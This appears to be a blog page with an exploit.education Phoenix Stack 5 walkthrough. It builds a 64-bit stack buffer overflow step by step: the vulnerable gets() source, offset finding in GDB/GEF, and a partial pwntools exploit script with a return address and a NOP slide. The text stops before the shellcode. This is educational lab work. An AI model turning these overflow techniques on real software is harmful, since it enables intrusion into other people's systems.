@@ -1,0 +1,660 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Simple 64-bit buffer overflow with shellcode - vymvn</title><meta name="Description" content="My personal website / blog"><meta property="og:title" content="Simple 64-bit buffer overflow with shellcode" />
+<meta property="og:description" content="Introduction Buffer overflow is a common vulnerability that has plagued software systems for years. It occurs when a program attempts to store data beyond the bounds of a buffer, causing the extra data to overwrite adjacent memory locations. This can lead to a variety of problems, including crashes, security breaches, and even the execution of malicious code. One of the most powerful ways to exploit a buffer overflow is by injecting shellcode into the overflowed buffer, which allows an attacker to take control of the program and execute arbitrary commands." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://example.org/2023-03-03-stack5/" /><meta property="og:image" content="http://example.org/assets/image/avatar.png"/><meta property="article:section" content="posts" />
+
+<meta property="og:site_name" content="vymvn" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="http://example.org/assets/image/avatar.png"/>
+
+<meta name="twitter:title" content="Simple 64-bit buffer overflow with shellcode"/>
+<meta name="twitter:description" content="Introduction Buffer overflow is a common vulnerability that has plagued software systems for years. It occurs when a program attempts to store data beyond the bounds of a buffer, causing the extra data to overwrite adjacent memory locations. This can lead to a variety of problems, including crashes, security breaches, and even the execution of malicious code. One of the most powerful ways to exploit a buffer overflow is by injecting shellcode into the overflowed buffer, which allows an attacker to take control of the program and execute arbitrary commands."/>
+<meta name="application-name" content="vymvn">
+<meta name="apple-mobile-web-app-title" content="vymvn"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://example.org/2023-03-03-stack5/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Simple 64-bit buffer overflow with shellcode",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/example.org\/2023-03-03-stack5\/"
+        },"genre": "posts","wordcount":  1853 ,
+        "url": "http:\/\/example.org\/2023-03-03-stack5\/","license": "lmao","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "vymvn"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="vymvn"><span class="header-title-pre">[+]</span><span id="id-1" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="vymvn"><span class="header-title-pre">[+]</span><span id="id-2" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Simple 64-bit buffer overflow with shellcode</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>vymvn</a>
+</span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="0001-01-01">0001-01-01</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1853 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;9 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#summary">Summary</a></li>
+    <li><a href="#binary-analysis">Binary analysis</a>
+      <ul>
+        <li><a href="#source-code">Source code</a></li>
+        <li><a href="#running">Running</a></li>
+      </ul>
+    </li>
+    <li><a href="#finding-offset">Finding offset</a></li>
+    <li><a href="#crafting-exploit">Crafting exploit</a>
+      <ul>
+        <li><a href="#payload">Payload</a>
+          <ul>
+            <li><a href="#step-1---find-stack-address">Step 1 - Find stack address</a></li>
+            <li><a href="#step-2---nop-slide">Step 2 - nop slide</a></li>
+            <li><a href="#part-3---shellcode">Part 3 - Shellcode</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#exploiting">Exploiting</a></li>
+    <li><a href="#mitigation">Mitigation</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="introduction">Introduction</h1>
+<p>Buffer overflow is a common vulnerability that has plagued software systems for years. It occurs when a program attempts to store data beyond the bounds of a buffer, causing the extra data to overwrite adjacent memory locations. This can lead to a variety of problems, including crashes, security breaches, and even the execution of malicious code. One of the most powerful ways to exploit a buffer overflow is by injecting shellcode into the overflowed buffer, which allows an attacker to take control of the program and execute arbitrary commands. In this blog post, we will explore the basics of buffer overflow attacks and demonstrate how to execute shellcode by solving Stack 5 from <a href="https://exploit.education/phoenix/" target="_blank" rel="noopener noreffer">Pheonix</a>
+.</p>
+<h1 id="summary">Summary</h1>
+<p>This level from Pheonix is a simple 64-bit buffer overflow that requires us to overflow the buffer and overwrite the return pointer to return to some shellcode that we have placed on the stack.</p>
+<h1 id="binary-analysis">Binary analysis</h1>
+<p>One of the first things I do when I have a binary is run <code>file</code> on it</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ file ./stack-five
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">./stack-five: ELF 64-bit LSB executable, x86-64, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /opt/phoenix/x86_64-linux-musl/lib/ld-musl-x86_64.so.1, not stripped
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>From this output we now know that we are working with a <code>64-bit</code> binary and we also know that it is dynamically linked and is not stripped of the debug symbols, which makes reverse engineering it much easier if we had to.</p>
+<h2 id="source-code">Source code</h2>
+<p>Since we are provided with the source code we won&rsquo;t have to do any disassemling or reverse engineering to figure out how this binary works</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cm">/*
+</span></span></span><span class="line"><span class="cl"><span class="cm"> * phoenix/stack-five, by https://exploit.education
+</span></span></span><span class="line"><span class="cl"><span class="cm"> *
+</span></span></span><span class="line"><span class="cl"><span class="cm"> * Can you execve(&#34;/bin/sh&#34;, ...) ?
+</span></span></span><span class="line"><span class="cl"><span class="cm"> *
+</span></span></span><span class="line"><span class="cl"><span class="cm"> * What is green and goes to summer camp? A brussel scout.
+</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="cp">#define BANNER \
+</span></span></span><span class="line"><span class="cl"><span class="cp">  &#34;Welcome to &#34; LEVELNAME &#34;, brought to you by https:</span><span class="c1">//exploit.education&#34;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">char</span> <span class="o">*</span><span class="nf">gets</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">start_level</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">BANNER</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">start_level</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>In the comments, we are given a hint that we need to run <code>execve(&quot;/bin/sh&quot;)</code>, but there is no <code>execve()</code> function being ran anywhere in the source code. And if we check the security measure applied using <code>checksec</code> from <code>pwntools</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ checksec ./stack-five
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/opt/phoenix/amd64/stack-five&#39;</span>
+</span></span><span class="line"><span class="cl">    Arch:     amd64-64-little
+</span></span><span class="line"><span class="cl">    RELRO:    No RELRO
+</span></span><span class="line"><span class="cl">    Stack:    No canary found
+</span></span><span class="line"><span class="cl">    NX:       NX disabled
+</span></span><span class="line"><span class="cl">    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">    RWX:      Has RWX segments
+</span></span><span class="line"><span class="cl">    RPATH:    <span class="s1">&#39;/opt/phoenix/x86_64-linux-musl/lib&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We see that NX (No execute from stack) is disabled, as well as all the other security measures. So now it is very obvious that we are going to need to inject our own shellcode.</p>
+<p>Starting with the main function, it simply prints the banner then calls <code>start_level()</code> which defines a 128 byte buffer and then uses <code>gets()</code> (the dangerous C function) to get user input and stores it in the 128 byte buffer without any checks for the length of the user supplied input whatsoever.</p>
+<h2 id="running">Running</h2>
+<p>Now that we know what it does, we can run it</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@phoenix-amd64:/opt/phoenix/amd64$ ./stack-five
+</span></span><span class="line"><span class="cl">Welcome to phoenix/stack-five, brought to you by https://exploit.education
+</span></span><span class="line"><span class="cl">hello
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>As we saw in the source it just takes input and exits.</p>
+<p>Now let&rsquo;s see what happens when we give it a big input</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@phoenix-amd64:/opt/phoenix/amd64$ python3 -c <span class="s2">&#34;print(&#39;A&#39; * 200)&#34;</span> <span class="p">|</span> ./stack-five
+</span></span><span class="line"><span class="cl">Welcome to phoenix/stack-five, brought to you by https://exploit.education
+</span></span><span class="line"><span class="cl">Segmentation fault
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>A segmentation fault! that means accessed parts of the memory we weren&rsquo;t supposed to.</p>
+<h1 id="finding-offset">Finding offset</h1>
+<p>To find the offset I will open the program in GDB and I am using <a href="https://github.com/hugsy/gef" target="_blank" rel="noopener noreffer">GEF</a>
+ because it comes with useful tools to help with exploit development. GEF also comes pre-installed on the Pheonix machine.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gef➤  pattern create <span class="m">200</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Generating a pattern of <span class="m">200</span> bytes
+</span></span><span class="line"><span class="cl">aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Saved as <span class="s1">&#39;$_gef0&#39;</span>
+</span></span><span class="line"><span class="cl">gef➤
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Using the <code>pattern create</code> command in GEF we can create a pattern that is unique for every 8 bytes, which will make it easy to find.</p>
+<p>Now we can run the program again and supply this pattern and we find which of the unique 8 bytes from the pattern ended up in <code>rip</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gef➤  r
+</span></span><span class="line"><span class="cl">Starting program: /opt/phoenix/amd64/stack-five
+</span></span><span class="line"><span class="cl">Welcome to phoenix/stack-five, brought to you by https://exploit.education
+</span></span><span class="line"><span class="cl">aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Program received signal SIGSEGV, Segmentation fault.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The program crashes as expected and GEF has hooks set up to print the registers, stack and instructions.</p>
+<p>Looking through the resgisters output we see:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">$rip</span>   : 0x6161616161616172 <span class="o">(</span><span class="s2">&#34;raaaaaaa&#34;</span>?<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The instruction pointer was overwritten with <code>raaaaaaa</code> meaning whatever we place instead of that will be our new <code>rip</code>.</p>
+<p>Now we use <code>pattern search</code> to find where that is in the pattern string</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gef➤  pattern search 0x6161616161616172
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Searching <span class="s1">&#39;0x6161616161616172&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Found at offset <span class="m">136</span> <span class="o">(</span>little-endian search<span class="o">)</span> likely
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Found at offset <span class="m">129</span> <span class="o">(</span>big-endian search<span class="o">)</span>
+</span></span><span class="line"><span class="cl">gef➤
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>From the binary analysis we know that this binary is little endian so now we know that the offset is <code>136</code></p>
+<h1 id="crafting-exploit">Crafting exploit</h1>
+<p>We can now start working on the exploit</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Defining binary</span>
+</span></span><span class="line"><span class="cl"><span class="nb">bin</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./stack-five&#39;</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="nb">bin</span><span class="o">.</span><span class="n">path</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s2">&#34;amd64&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># The offset and padding we need to overflow the buffer</span>
+</span></span><span class="line"><span class="cl"><span class="n">OFFSET</span>  <span class="o">=</span> <span class="mi">136</span>
+</span></span><span class="line"><span class="cl"><span class="n">PADDING</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="n">OFFSET</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>I am using the <code>pwntools</code> library and I create a an ELF binary object, start the proccess which will open the program to interact with with it and I set the architecture.</p>
+<h2 id="payload">Payload</h2>
+<p>Currently our exploit will take us to the address where it will overwrite <code>rip</code> and then just go into the stack. So first part of our payload will be the address to write into <code>rip</code> and then we are going to need a nop slide to make sure we hit our shellcode and then finally, our shellcode.</p>
+<blockquote>
+<p>When performing a buffer overflow attack, a NOP slide can help an attacker hit their shellcode by creating a region of uncertainty about the exact location of the code. By inserting a large block of NOP instructions in between the code and the shellcode, an attacker can increase the chances of their shellcode being executed, even if they do not know the exact location of the code they are trying to overwrite. - ChatGPT
+{: .prompt-info}</p>
+</blockquote>
+<h3 id="step-1---find-stack-address">Step 1 - Find stack address</h3>
+<p>I want to make sure I have the stack address at the point where the main function would return.</p>
+<p>We can do that by first adding a breakpoint at the return instruction of <code>main()</code> in GDB.</p>
+<p>To see the addresses of the instructions we can disassemble the function:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gef➤  disas main
+</span></span><span class="line"><span class="cl">Dump of assembler code <span class="k">for</span> <span class="k">function</span> main:
+</span></span><span class="line"><span class="cl">   0x00000000004005a4 &lt;+0&gt;:	push   rbp
+</span></span><span class="line"><span class="cl">   0x00000000004005a5 &lt;+1&gt;:	mov    rbp,rsp
+</span></span><span class="line"><span class="cl">   0x00000000004005a8 &lt;+4&gt;:	sub    rsp,0x10
+</span></span><span class="line"><span class="cl">   0x00000000004005ac &lt;+8&gt;:	mov    DWORD PTR <span class="o">[</span>rbp-0x4<span class="o">]</span>,edi
+</span></span><span class="line"><span class="cl">   0x00000000004005af &lt;+11&gt;:	mov    QWORD PTR <span class="o">[</span>rbp-0x10<span class="o">]</span>,rsi
+</span></span><span class="line"><span class="cl">   0x00000000004005b3 &lt;+15&gt;:	mov    edi,0x400620
+</span></span><span class="line"><span class="cl">   0x00000000004005b8 &lt;+20&gt;:	call   0x400400 &lt;puts@plt&gt;
+</span></span><span class="line"><span class="cl">   0x00000000004005bd &lt;+25&gt;:	mov    eax,0x0
+</span></span><span class="line"><span class="cl">   0x00000000004005c2 &lt;+30&gt;:	call   0x40058d &lt;start_level&gt;
+</span></span><span class="line"><span class="cl">   0x00000000004005c7 &lt;+35&gt;:	mov    eax,0x0
+</span></span><span class="line"><span class="cl">   0x00000000004005cc &lt;+40&gt;:	leave
+</span></span><span class="line"><span class="cl">   0x00000000004005cd &lt;+41&gt;:	ret
+</span></span><span class="line"><span class="cl">End of assembler dump.
+</span></span><span class="line"><span class="cl">gef➤  b *0x4005cd
+</span></span><span class="line"><span class="cl">Breakpoint <span class="m">1</span> at 0x4005cd
+</span></span><span class="line"><span class="cl">gef➤
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The address we are interested in is the last one (<code>ret</code>) which is <code>0x4005cd</code> we don&rsquo;t need to grab the extra 0s because pwntools knows it is a 64-bit program and will treat it accordingly.</p>
+<p>Now we run program normally with normal input and it stops at the breakpoint.</p>
+<p>From here we use <code>info registers</code> to look at the registers</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gef➤  info registers
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">rsp            0x7fffffffebe8      0x7fffffffebe8
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">gef➤
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This address is the stack address. We can now update that in the exploit.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">rip</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x7fffffffebe8</span> <span class="o">+</span> <span class="mi">40</span><span class="p">)</span> <span class="c1"># new rip -&gt; rsp</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>Notice I am also adding <code>+ 40</code> to the address just to make sure we hit our nop slide.
+{: .prompt-tip}</p>
+</blockquote>
+<h3 id="step-2---nop-slide">Step 2 - nop slide</h3>
+<p>This part is pretty simple. The opcode of a nop instruction is 0x90. We use that as a raw byte in the code as <code>\x90</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">nop_slide</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x90</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="mi">100</span>
+</span></span></code></pre></td></tr></table>
+</div>
